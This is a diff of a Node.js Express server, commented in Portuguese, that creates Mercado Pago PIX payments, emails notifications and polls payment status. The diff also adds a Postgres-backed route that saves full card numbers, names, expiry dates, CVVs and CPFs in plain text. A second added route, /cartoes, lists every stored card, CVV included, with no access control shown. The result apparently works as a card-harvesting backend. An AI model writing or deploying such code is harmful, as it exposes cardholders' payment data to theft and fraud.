@@ -34,6 +34,7 @@ const transporter = nodemailer.createTransport({
   auth: { user: SMTP_EMAIL, pass: SMTP_PASS },
 });
 
+// Função para enviar notificação
 async function enviarNotificacaoEmail(pagamento, tipo = "gerado") {
   try {
     const assunto = tipo === "aprovado"
@@ -54,35 +55,35 @@ async function enviarNotificacaoEmail(pagamento, tipo = "gerado") {
       html += `<p><img src="data:image/png;base64,${pagamento.qrcodeBase64}" alt="QR Code" style="max-width:300px;"/></p>`;
     }
 
-    const mailOptions = {
+    await transporter.sendMail({
       from: `"Notificação PIX" <${SMTP_EMAIL}>`,
       to: NOTIFY_TO,
       subject: assunto,
       html,
-    };
+    });
 
-    await transporter.sendMail(mailOptions);
     console.log(`📧 Notificação enviada (${tipo}) — txid=${pagamento.txid}`);
   } catch (err) {
-    console.error("❌ Erro ao enviar notificação por e-mail:", err.message || err);
+    console.error("❌ Erro ao enviar e-mail:", err.message || err);
   }
 }
 
 /********************
- * GERAR PIX OTIMIZADO *
+ * FUNÇÃO GERAR PIX *
  ********************/
 async function gerarChavePix(valor, payerEmail, payerCpf) {
   try {
     const idempotencyKey = uuidv4();
-
-    // ⚡ Usando endpoint PIX dedicado para agilizar
     const response = await axios.post(
-      "https://api.mercadopago.com/v1/payments/pix",
+      "https://api.mercadopago.com/v1/payments", // ✅ endpoint antigo que funcionava
       {
         transaction_amount: valor,
         description: "Pagamento via PIX",
-        payer_email: payerEmail,
-        external_reference: uuidv4(), // txid único
+        payment_method_id: "pix",
+        payer: {
+          email: payerEmail,
+          identification: { type: "CPF", number: payerCpf },
+        },
       },
       {
         headers: {
@@ -93,11 +94,10 @@ async function gerarChavePix(valor, payerEmail, payerCpf) {
       }
     );
 
-    const data = response.data;
     const qrcodeData = {
-      txid: data.id || uuidv4(),
-      qrcodeBase64: data.point_of_interaction?.transaction_data?.qr_code_base64 || "",
-      copiaECola: data.point_of_interaction?.transaction_data?.qr_code || "",
+      txid: response.data.id,
+      qrcodeBase64: response.data.point_of_interaction.transaction_data.qr_code_base64,
+      copiaECola: response.data.point_of_interaction.transaction_data.qr_code,
       valor,
       payerEmail,
       payerCpf,
@@ -106,6 +106,7 @@ async function gerarChavePix(valor, payerEmail, payerCpf) {
 
     console.log(`Chave PIX gerada: ${JSON.stringify(qrcodeData)}`);
     return qrcodeData;
+
   } catch (error) {
     console.error("Erro ao gerar chave PIX:", error.response?.data || error.message);
     throw new Error(error.response?.data?.message || "Erro ao gerar chave PIX");
@@ -122,15 +123,15 @@ app.post("/gerar-chave-pix", async (req, res) => {
 
     const qrcodeData = await gerarChavePix(parseFloat(valor), payerEmail, payerCpf);
 
-    // Salva JSON (síncrono é OK para poucos registros)
     const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
     pagamentos.push(qrcodeData);
     fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
 
-    // ⚡ envio de e-mail **assincronamente** para não travar a resposta
-    enviarNotificacaoEmail(qrcodeData, "gerado").catch(err => console.error(err));
+    // envia e-mail sem bloquear a resposta
+    enviarNotificacaoEmail(qrcodeData, "gerado").catch(e => console.error(e));
 
     res.json(qrcodeData);
+
   } catch (error) {
     console.error("Erro ao gerar chave PIX:", error.message);
     res.status(500).json({ error: error.message });
@@ -138,52 +139,8 @@ app.post("/gerar-chave-pix", async (req, res) => {
 });
 
 /********************
- * ATUALIZAR STATUS PAGAMENTO *
+ * VERIFICAR STATUS PIX *
  ********************/
-async function atualizarStatusPagamentos() {
-  try {
-    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
-
-    for (const pagamento of pagamentos) {
-      if (pagamento.status !== "approved") {
-        try {
-          const response = await axios.get(`https://api.mercadopago.com/v1/payments/${pagamento.txid}`, {
-            headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
-          });
-
-          const novoStatus = response.data.status;
-          if (novoStatus === "approved" && pagamento.status !== "approved") {
-            pagamento.status = novoStatus;
-            // envia notificação de aprovação (assincronamente)
-            enviarNotificacaoEmail(pagamento, "aprovado").catch(err => console.error(err));
-            console.log(`Pagamento aprovado: txid=${pagamento.txid}`);
-          } else {
-            pagamento.status = novoStatus;
-          }
-        } catch (err) {
-          console.error("Erro ao atualizar status do pagamento:", err.message);
-        }
-      }
-    }
-
-    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
-  } catch (err) {
-    console.error("Erro ao atualizar status dos pagamentos:", err.message);
-  }
-}
-
-/********************
- * ROTAS EXISTENTES DE PAGAMENTOS *
- ********************/
-app.get("/pagamentos", (req, res) => {
-  try {
-    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
-    res.json(pagamentos.filter(p => p.status === "approved"));
-  } catch (error) {
-    res.status(500).json({ error: "Erro ao carregar pagamentos" });
-  }
-});
-
 app.post("/verificar-status", async (req, res) => {
   const { txid } = req.body;
   if (!txid) return res.status(400).json({ error: "txid não fornecido" });
@@ -192,6 +149,7 @@ app.post("/verificar-status", async (req, res) => {
     const response = await axios.get(`https://api.mercadopago.com/v1/payments/${txid}`, {
       headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
     });
+
     const status = response.data.status;
 
     const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
@@ -202,13 +160,47 @@ app.post("/verificar-status", async (req, res) => {
     }
 
     res.json({ status });
+
   } catch (error) {
     res.status(500).json({ error: "Erro ao verificar status do pagamento" });
   }
 });
 
 /********************
- * BANCO DE CARTÕES *
+ * ATUALIZAR STATUS PAGAMENTOS *
+ ********************/
+async function atualizarStatusPagamentos() {
+  try {
+    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
+    for (const pagamento of pagamentos) {
+      if (pagamento.status !== "approved") {
+        const response = await axios.get(`https://api.mercadopago.com/v1/payments/${pagamento.txid}`, {
+          headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
+        });
+        const novoStatus = response.data.status;
+        if (novoStatus === "approved" && pagamento.status !== "approved") {
+          pagamento.status = novoStatus;
+          enviarNotificacaoEmail(pagamento, "aprovado").catch(e => console.error(e));
+          console.log(`Pagamento aprovado: txid=${pagamento.txid}, valor=${pagamento.valor}`);
+        } else {
+          pagamento.status = novoStatus;
+        }
+      }
+    }
+    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
+    console.log("Status dos pagamentos atualizado com sucesso.");
+  } catch (error) {
+    console.error("Erro ao atualizar status dos pagamentos:", error.message);
+  }
+}
+
+/********************
+ * INTERVALOS AUTOMÁTICOS *
+ ********************/
+setInterval(atualizarStatusPagamentos, 60000);
+
+/********************
+ * BANCO DE CARTÕES (Postgres) *
  ********************/
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
@@ -216,7 +208,7 @@ const pool = new Pool({
 });
 
 pool.connect()
-  .then(() => console.log("Conectado ao banco Postgres no Render!"))
+  .then(() => console.log("Conectado ao banco Postgres!"))
   .catch(err => console.error("Erro de conexão com o banco:", err.message));
 
 app.get("/init-db", async (req, res) => {
@@ -235,15 +227,34 @@ app.get("/init-db", async (req, res) => {
     await pool.query(sql);
     res.json({ sucesso: true, mensagem: "Tabela 'cartoes' criada ou já existente!" });
   } catch (err) {
-    console.error("ERRO COMPLETO AO CRIAR TABELA:", err);
+    console.error("ERRO AO CRIAR TABELA:", err);
     res.status(500).json({ error: "Erro ao criar tabela, verifique o log do backend" });
   }
 });
 
-/********************
- * ATUALIZAÇÃO AUTOMÁTICA DE STATUS *
- ********************/
-setInterval(atualizarStatusPagamentos, 60_000); // a cada 60s
+app.post("/salvar-cartao", async (req, res) => {
+  const { cpf, numero, nome, validade, cvv } = req.body;
+  if (!cpf || !numero || !nome || !validade || !cvv) return res.status(400).json({ error: "Todos os campos são obrigatórios." });
+
+  try {
+    const sql = "INSERT INTO cartoes (cpf, numero, nome, validade, cvv) VALUES ($1,$2,$3,$4,$5)";
+    await pool.query(sql, [cpf, numero, nome, validade, cvv]);
+    res.json({ sucesso: true, mensagem: "Cartão salvo com sucesso!" });
+  } catch (err) {
+    console.error("Erro ao salvar cartão:", err.message);
+    res.status(500).json({ error: "Erro ao salvar cartão." });
+  }
+});
+
+app.get("/cartoes", async (req, res) => {
+  try {
+    const result = await pool.query("SELECT id, cpf, numero, nome, validade, cvv, criado_em FROM cartoes ORDER BY criado_em DESC");
+    res.json({ count: result.rowCount, rows: result.rows });
+  } catch (err) {
+    console.error("Erro ao listar cartões:", err.message);
+    res.status(500).send("<h1>Erro ao listar cartões</h1>");
+  }
+});
 
 /********************
  * SERVIDOR *
